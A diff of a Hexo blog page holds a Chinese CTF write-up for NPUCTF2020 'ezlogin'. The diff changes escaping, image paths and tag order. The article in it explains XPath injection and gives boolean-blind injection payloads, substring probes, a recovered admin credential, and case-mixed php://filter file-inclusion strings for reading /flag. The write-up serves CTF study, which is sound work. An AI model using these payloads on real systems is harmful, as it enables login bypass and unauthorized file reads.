@@ -7,9 +7,9 @@
     <meta name="keywords" content="刷题笔记:[NPUCTF2020]ezlogin, 远离尘世的幻想乡">
     <meta name="description" content="前言关键字:[登录框动画]
 
-题解看了下，登录验证在static/main.js里
+题解看了下，登录验证在static&amp;#x2F;main.js里
 var current &amp;#x3D; null;
-document.querySelector(&amp;#39;#username&amp;#39;).addEventL">
+document.querySelector(&amp;#39;#username&amp;#39;).addE">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -45,7 +45,7 @@ document.querySelector(&amp;#39;#username&amp;#39;).addEventL">
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -520,12 +520,12 @@ document.querySelector(&amp;#39;#username&amp;#39;).addEventL">
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                     </div>
@@ -589,8 +589,8 @@ document.querySelector(&amp;#39;#username&amp;#39;).addEventL">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[登录框动画]</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203523313.png"></p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看了下，登录验证在static/main.js里</p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203523313.png"></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看了下，登录验证在static&#x2F;main.js里</p>
 <pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var current &#x3D; null;
 document.querySelector(&#39;#username&#39;).addEventListener(&#39;focus&#39;, function(e) &#123;
   if (current) current.pause();
@@ -671,11 +671,11 @@ function doLogin()&#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这动画还蛮炫的</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203824528.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203824528.png"></p>
 <p>是以这样的形式传过去的：</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826204841573.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826204841573.png"></p>
 <p>加个<code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>提示格式错误</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826205028810.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826205028810.png"></p>
 <p>还以为是XXE试了半天不行，一看wp，得，xpath注入。</p>
 <p>虽然爬虫用过xpath，但没想到还能注入。</p>
 <h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><blockquote>
@@ -700,7 +700,7 @@ function doLogin()&#123;
 </ul>
 <p>举个例子</p>
 <p>users.xml：</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>
@@ -758,7 +758,7 @@ p <span class="token operator">=</span> <span class="token string">""</span><spa
 
 <p>这是根据XML特性来的</p>
 <blockquote>
-<p>查询如果不是用[键=’值’]这种方式的查询，只会返回所有路径标签的值<br>如果带有[键=’值’]的查询，会返回和该路径相同的所有路径和该类路径之下节点的所有的值</p>
+<p>查询如果不是用[键&#x3D;’值’]这种方式的查询，只会返回所有路径标签的值<br>如果带有[键&#x3D;’值’]的查询，会返回和该路径相同的所有路径和该类路径之下节点的所有的值</p>
 </blockquote>
 <h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>1.判断根节点数量</p>
 <pre class="line-numbers language-xquery" data-language="xquery"><code class="language-xquery">u <span class="token operator">=</span> <span class="token string">"' or count(/)=1 or '1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -822,14 +822,14 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <blockquote>
 <p>注意，xpath是从[1]开始的</p>
 </blockquote>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826214759893.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826214759893.png"></p>
 <p>root的子节点</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826215028755.png"></p>
-<p>/root/accounts的子节点</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220116565.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826215028755.png"></p>
+<p>&#x2F;root&#x2F;accounts的子节点</p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220116565.png"></p>
 <p>就是这样一个一个跑就行了。</p>
 <p>跑出来大概形式就是这样</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>accounts</span><span class="token punctuation">></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>
                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
@@ -848,8 +848,8 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <pre class="line-numbers language-none"><code class="language-none">substring(string(&#x2F;*[1]&#x2F;*[1]&#x2F;*[2]&#x2F;*[3]),1,1)&#x3D;&#39;a&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>用adm1n@gtfly123登录</p>
-<p>登录后发现base64，解码：flag is in /flag</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220844743.png"></p>
+<p>登录后发现base64，解码：flag is in &#x2F;flag</p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220844743.png"></p>
 <p>利用文件包含，提示nonono。有过滤，最后用大小写绕过，这要是不说，没有源码真想不到啊，尽量多做尝试吧。</p>
 <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;pHp:&#x2F;&#x2F;filter&#x2F;convert.BAse64-encode&#x2F;resource&#x3D;&#x2F;flag
 ?file&#x3D;pHp:&#x2F;&#x2F;FiltEr&#x2F;convert.BAse64-eNcode&#x2F;resource&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -919,12 +919,12 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                         </div>
@@ -1274,12 +1274,12 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/XXE/">
@@ -1331,12 +1331,12 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
